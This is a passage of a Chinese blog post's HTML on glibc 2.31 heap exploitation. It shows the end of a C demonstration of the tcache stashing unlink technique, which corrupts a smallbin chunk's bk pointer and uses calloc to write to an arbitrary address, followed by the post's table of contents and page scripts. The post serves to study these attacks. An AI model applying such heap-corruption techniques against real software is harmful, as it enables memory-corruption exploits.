<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n&quot;</span>, <br>		t1, t1<span class="hljs-number">-0x60</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">2</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">3</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">4</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">5</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n3. free two chunk with the same size like tcache_entry into the corresponding smallbin\n&quot;</span>);<br><br>	s1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Alloc a chunk %p, whose size is beyond tcache size threshold\n&quot;</span>, s1);<br>	pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Alloc a padding chunk, avoid %p to merge to top chunk\n&quot;</span>, s1);<br>	<span class="hljs-built_in">free</span>(s1);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Free chunk %p to unsortedbin\n&quot;</span>, s1);<br>	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x3c0</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n&quot;</span>);<br>	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;chunk %p is in smallbin[4], whose size is 0x60\n&quot;</span>, s1+<span class="hljs-number">0x3c0</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Repeat the above steps, and free another chunk into corresponding smallbin\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n&quot;</span>);<br>	s2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);<br>	pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>	<span class="hljs-built_in">free</span>(s2);<br>	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x3c0</span>);<br>	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;chunk %p is in smallbin[4], whose size is 0x60\n&quot;</span>, s2+<span class="hljs-number">0x3c0</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;smallbin[4] list is %p &lt;--&gt; %p\n&quot;</span>, s2+<span class="hljs-number">0x3c0</span>, s1+<span class="hljs-number">0x3c0</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n4. overwrite the first chunk in smallbin[4]&#x27;s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\n&quot;</span>);<br>	<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Change %p&#x27;s bk pointer to &amp;victim-0x10 address: 0x%lx\n&quot;</span>, s2+<span class="hljs-number">0x3c0</span>, (<span class="hljs-keyword">uint64_t</span>)(&amp;victim)<span class="hljs-number">-0x10</span>);<br>	*(<span class="hljs-keyword">uint64_t</span>*)((s2+<span class="hljs-number">0x3c0</span>)+<span class="hljs-number">0x18</span>) = (<span class="hljs-keyword">uint64_t</span>)(&amp;victim)<span class="hljs-number">-0x10</span>;<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n5. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n&quot;</span>);<br><br>	<span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Finally, the victim&#x27;s value is changed to a big number\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now, victim&#x27;s value: 0x%lx\n&quot;</span>, victim);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;	<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="tcache-stashing-unlink-1"><a href="#tcache-stashing-unlink-1" class="headerlink" title="tcache_stashing_unlink"></a>tcache_stashing_unlink</h3><ul>
+<li></li>
+</ul>
+
+      </section>
+      <section class="extra">
+        
+          <ul class="copyright">
+  
+    <li><strong>本文作者：</strong>ShouCheng</li>
+    <li><strong>本文链接：</strong><a href="http://shoucheng3.github.io/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/index.html" title="http:&#x2F;&#x2F;shoucheng3.github.io&#x2F;2022&#x2F;03&#x2F;14&#x2F;2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8&#x2F;index.html">http:&#x2F;&#x2F;shoucheng3.github.io&#x2F;2022&#x2F;03&#x2F;14&#x2F;2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8&#x2F;index.html</a></li>
+    <li><strong>版权声明：</strong>本博客所有文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" title="BY-NC-SA" target="_blank" rel="noopener">BY-NC-SA</a> 许可协议，转载请注明出处！</li>
+  
+</ul>
+        
+        
+        
+  <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/glibc/" rel="tag">glibc</a></li></ul> 
+
+        
+  <nav class="nav">
+    <a></a>
+    <a href="/2022/03/03/2022-01-12-global-max-fast/">global_max_fast<i class="iconfont iconright"></i></a>
+  </nav>
+
+      </section>
+      
+        <section class="comments">
+  
+    <div class="btn" id="comments-btn">查看评论</div>
+  
+  
+</section>
+      
+    </section>
+  </div>
+</article></div>
+      <div class="col-xl-3">
+        
+          
+  <aside class="toc-wrap">
+    <h3 class="toc-title">文章目录：</h3>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#glibc-2-29-2-31"><span class="toc-text">glibc-2.29~2.31</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#fastbin-double-free"><span class="toc-text">fastbin_double_free</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-double-free-%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93"><span class="toc-text">fastbin_double_free 利用总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tcache-double-free"><span class="toc-text">tcache_double_free</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#tcache-double-free-%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93"><span class="toc-text">tcache_double_free 利用总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tcache-poisoning"><span class="toc-text">tcache_poisoning</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#tcache-poisoning-%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93"><span class="toc-text">tcache_poisoning 利用总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tcache-stashing-unlink"><span class="toc-text">tcache_stashing_unlink</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#tcache-stashing-unlink-1"><span class="toc-text">tcache_stashing_unlink</span></a></li></ol></li></ol></li></ol>
+  </aside>
+
+        
+      </div>
+    </div>
+  </div>
+</main>
+  
+
+<footer class="footer">
+  <div class="footer-social"><a 
+        href="tencent://message/?Menu=yes&uin=1145020611 "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#12B7F5'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconQQ "></i>
+      </a><a 
+        href="javascript:; "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#09BB07'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconwechat-fill "></i>
+      </a><a 
+        href="https://www.instagram.com/izhaoo/ "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#DA2E76'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconinstagram "></i>
+      </a><a 
+        href="https://shoucheng3.github.io "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#9f7be1'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  icongithub-fill "></i>
+      </a><a 
+        href="mailto:1145020611@qq.com "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color=#FF3B00" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconmail"></i>
+      </a></div>
+  
+    <div class="footer-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+  
+</footer>
+  
+      <div class="fab fab-plus">
+    <i class="iconfont iconplus"></i>
+  </div>
+  
+    <div class="fab fab-daovoice">
+      <i class="iconfont iconcomment"></i>
+    </div>
+  
+  
+    <a href="https://support.qq.com/product/325288# app_id" target="_blank">
+      <div class="fab fab-tencent-chao">
+        <i class="iconfont iconcomment"></i>
+      </div>
+    </a>
+  
+  <div class="fab fab-up">
+    <i class="iconfont iconcaret-up"></i>
+  </div>
+  
+  
+  
+    
+<script src="/js/color-mode.js"></script>
+
+  
+  
+    <div class="search">
+  <div class="search-container">
+    <div class="search-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <div class="search-input-wrapper">
+      <i class="search-input-icon iconfont iconsearch"></i>
+      <input class="search-input" type="search" id="search-input" placeholder="Search..." autofocus autocomplete="off"
+        autocorrect="off" autocapitalize="off">
+    </div>
+    <div class="search-output" id="search-output"></div>
+  </div>
+</div>
+  
+</body>
+
+<script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+
+
+
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.qrcode/1.0/jquery.qrcode.min.js"></script>
+
+
+
+
+<script src="/js/utils.js"></script>
+<script src="/js/script.js"></script>
+
+
+
+
+
+  
+
+<script>
+  (function (i, s, o, g, r, a, m) {
+    i["DaoVoiceObject"] = r;
+    i[r] = i[r] || function () {
+      (i[r].q = i[r].q || []).push(arguments)
+    }, i[r].l = 1 * new Date();
+    a = s.createElement(o), m = s.getElementsByTagName(o)[0];
+    a.async = 1;
+    a.src = g;
+    a.charset = "utf-8";
+    m.parentNode.insertBefore(a, m)
+  })(window, document, "script", "https://widget.daovoice.io/widget/0f81ff2f.js", "daovoice")
+  daovoice('init', {
+    app_id: "3abd194f# app_id"
+  }, {
+    launcher: {
+      disableLauncherIcon: true,
+    },
+  });
+  daovoice('update');
+</script>
+
+
+
+  <script>
+    (function () {
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      } else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</html>
